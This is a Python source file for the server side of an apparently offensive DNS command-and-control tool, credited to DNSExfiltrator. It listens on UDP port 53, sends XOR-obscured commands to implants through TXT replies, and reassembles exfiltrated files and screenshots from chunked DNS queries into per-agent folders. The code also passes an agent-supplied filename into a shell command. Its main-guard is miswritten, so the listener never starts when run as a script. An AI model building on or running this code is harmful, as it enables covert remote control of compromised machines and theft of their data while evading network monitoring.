#!/usr/bin/python3
import socket
import dnslib
import base64
import sys
import handlers
import tasks
import os
import encrypt
import subprocess
import time
from datetime import datetime

# Credits to https://github.com/Arno0x/DNSExfiltrator

def StartDNSListener(self):

	# Setup a UDP server listening on port UDP 53	
	udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	udps.bind(('0.0.0.0',53))

	try:
		numberOfChunks = 0
		chunkIndex = 0
		fileData = ''
		domainName = tasks.define_dns_domain.dnsDomainName
		tasks.send_command.send_cmd = "OK"

		while True:
			data, addr = udps.recvfrom(1024)
			request = dnslib.DNSRecord.parse(data)

			if request.q.qtype == 16:
				
				# Get the query qname
				qname = str(request.q.qname)

				if qname.startswith("checker."):
					checkerDetails = qname.split(".")
					# DNS Agent Isolation
					if checkerDetails[1] == tasks.agent_iso_class.unique_agent_name:
						if len(tasks.send_command.send_cmd) > 255:
							print("Task lengh is more than 255 characters.")
							print("Functionality added in TODO list for future release.")
							tasks.send_command.send_cmd = "OK"
						else:
							xorkey = 'j' * len(tasks.send_command.send_cmd)
							encrypt_cmd = encrypt.Encryption.xor_crypt_string(self, tasks.send_command.send_cmd, xorkey, True, False)
							reply = dnslib.DNSRecord(dnslib.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
							reply.add_answer(dnslib.RR(request.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT(encrypt_cmd)))
							udps.sendto(reply.pack(), addr)
							tasks.send_command.send_cmd = "OK"
					else:
						reply = dnslib.DNSRecord(dnslib.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
						reply.add_answer(dnslib.RR(request.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT("OK")))
						udps.sendto(reply.pack(), addr)

				elif qname.startswith("agent."):
					agentDetails = qname.split(".")
					agentChunk = encrypt.Encryption.fromBase64URL(self, agentDetails[1])
					numberOfChunks = int(agentChunk)

					# Reset all variables
					fileData = ''
					chunkIndex = 0

					# send OK in order to receive the data
					reply = dnslib.DNSRecord(dnslib.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
					reply.add_answer(dnslib.RR(request.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT("OK")))
					udps.sendto(reply.pack(), addr)

				elif qname.startswith("results."):
					resultsDetails = qname.split(".")
					resultsChunk = encrypt.Encryption.fromBase64URL(self, resultsDetails[1])
					numberOfChunks = int(resultsChunk)

					# Reset all variables
					fileData = ''
					chunkIndex = 0

					# send OK in order to receive the data
					reply = dnslib.DNSRecord(dnslib.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
					reply.add_answer(dnslib.RR(request.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT("OK")))
					udps.sendto(reply.pack(), addr)

				else:
					try:
						msg = qname[0:-(len(domainName)+2)]
						chunkNumber, rawData = msg.split('.',1)
					except:
						print("Failed to split the message.")
					
					if (int(chunkNumber) == chunkIndex):
						fileData += rawData.replace('.','')
						chunkIndex += 1
					
					# Always acknowledge the received chunk (whether or not it was already received)
					reply = dnslib.DNSRecord(dnslib.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
					reply.add_answer(dnslib.RR(request.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT(chunkNumber)))
					udps.sendto(reply.pack(), addr)
					
					# Have we received all chunks of data ?
					if chunkIndex == numberOfChunks:
						try:
							if agentDetails[0] == "agent":
								results = encrypt.Encryption.fromBase64URL(self, fileData)
								decodeData = results.decode()
								realData = str(decodeData)
								xorkey = 'j' * len(realData)
								data = encrypt.Encryption.xor_crypt_string(self, realData, xorkey, False, True)
								agentName = data.split(" ")
								print("DNS Agent " + agentName[0] + " Arrived!\n")
								# clean agentdetails variable
								agentDetails[0] = "clean"
								handlers.listAllAgents.append(data)
							else:
								results = encrypt.Encryption.fromBase64URL(self, fileData)
								decodeData = results.decode()
								realData = str(decodeData)
								xorkey = 'j' * len(realData)
								data = encrypt.Encryption.xor_crypt_string(self, realData, xorkey, False, True)
								if "DownloadingFileRand1me3" in data:
									AgentFolder = './Agents/' + tasks.agent_iso_class.unique_agent_name
									os.chdir(os.path.dirname(__file__))
									if not os.path.exists(AgentFolder + '/Downloads'):
										os.makedirs(AgentFolder + '/Downloads')
									split_data = data.split(" ")
									tempFile = "ignoremeFile.txt"
									# https://stackoverflow.com/questions/22216076/unicodedecodeerror-utf8-codec-cant-decode-byte-0xa5-in-position-0-invalid-s
									fullPath = AgentFolder + '/Downloads/' + tempFile
									orgFile = AgentFolder + '/Downloads/' + split_data[1]
									try:
										with open(fullPath, 'w') as out_file:
											out_file.write(split_data[2])
											out_file.close()
											Convertb64_to_orgFile = subprocess.Popen("cat "+ fullPath + " | base64 -d > "+ orgFile,stdin=subprocess.PIPE, shell=True)
											Convertb64_to_orgFile.communicate()
											print("File " + split_data[1] + " Downloaded Successfully under " + orgFile)
									except:
										print("Failed to download the file!")
								elif "This1sScreenSh0t" in data:
									AgentFolder = './Agents/' + tasks.agent_iso_class.unique_agent_name
									os.chdir(os.path.dirname(__file__))
									if not os.path.exists(AgentFolder + '/Screenshots'):
										os.makedirs(AgentFolder + '/Screenshots')
									split_data = data.split(" ")
									imgPath = AgentFolder + '/Screenshots/'
									try:
										with open(imgPath + tasks.agent_iso_class.unique_agent_name + str(datetime.now().strftime('-%d%m%Y-%H.%M.%S')) + '.png', 'wb') as out_image:
											out_image.write(base64.b64decode(split_data[1]))
											out_image.close()
											print("Screenshot save under " + imgPath)
									except:
											print("Screenshot failed")
								else:
									print(data)
						except IOError:
							print("[!] Could not read")
	
			# Query type is not TXT
			else:
				reply = dnslib.DNSRecord(dnslib.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
				udps.sendto(reply.pack(), addr)
	except KeyboardInterrupt:
		print("[!] Stopping DNS Server")
		udps.close()

if __name__ == '__StartDNSListener__':
	StartDNSListener("")

